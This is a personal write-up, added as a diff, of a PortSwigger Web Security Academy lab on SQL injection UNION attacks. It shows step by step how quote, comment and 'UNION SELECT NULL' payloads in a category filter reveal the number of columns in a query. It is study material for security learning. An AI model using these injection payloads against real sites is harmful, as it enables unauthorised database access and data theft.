@@ -1,0 +1,63 @@
+SQL Injection
+
+Lab: SQL injection UNION attack, determining the number of columns returned by the query
+End Goal: determine the number of columns using UNION
+
+Background
+
+Table1         Table2
+a | b          c | d
+1, 2           2, 3
+3, 4           4, 5
+
+Query 1:
+SELECT a, b from Table1
+1, 2
+3, 4
+
+Query 2:
+SELECT a, b from Table1 UNION SELECT c, d from Table2
+1, 2
+3, 4
+2, 3
+4, 5
+
+
+https://0a630098042db9368359057300e700d8.web-security-academy.net/
+
+Analysis:
+1.
+See if the filter?category='
+if getting internal server error
+https://0a630098042db9368359057300e700d8.web-security-academy.net/filter?category='
+command: SELECT * FROM product WHERE category = ' and released = 1
+executed command: SELECT * FROM product WHERE category = '
+Observation: will throw an internal server error due wrong sql syntax
+
+2.
+See if the filter?category='--
+https://0a630098042db9368359057300e700d8.web-security-academy.net/filter?category='--
+command:SELECT * FROM product WHERE category = '-- and released = 1
+executed command: SELECT * FROM product WHERE category = '--
+Observation: we nullify the error by commenting after our injection
+
+3.
+See if you can filter?category="Gifts'--"
+https://0a630098042db9368359057300e700d8.web-security-academy.net/filter?category=Gifts'--
+command: SELECT * FROM product WHERE category = Gifts'-- and released = 1
+executed command: SELECT * FROM product WHERE category = Gifts'--
+Observation: Will show all products under defined category filter
+
+4.
+See if you can "Gifts' UNION select NULL--"
+https://0a630098042db9368359057300e700d8.web-security-academy.net/filter?category=Gifts' union select null--
+command: SELECT * FROM product WHERE category = Gifts' union select null-- and released = 1
+executed command: SELECT * FROM product WHERE category = Gifts' union select null--
+Observation: Will show internal server error since the tables have different number of columns, we need to add more null columns and try
+
+5.
+Add more NULLs until there's no errors
+https://0a630098042db9368359057300e700d8.web-security-academy.net/filter?category=Gifts' union select null, null, null--
+command: SELECT * FROM product WHERE category = Gifts' union select null, null, null-- and released = 1
+executed command: SELECT * FROM product WHERE category = Gifts' union select null, null, null--
+Observation: Will not show error and shows the null row at the end, that means the products table has 3 columns
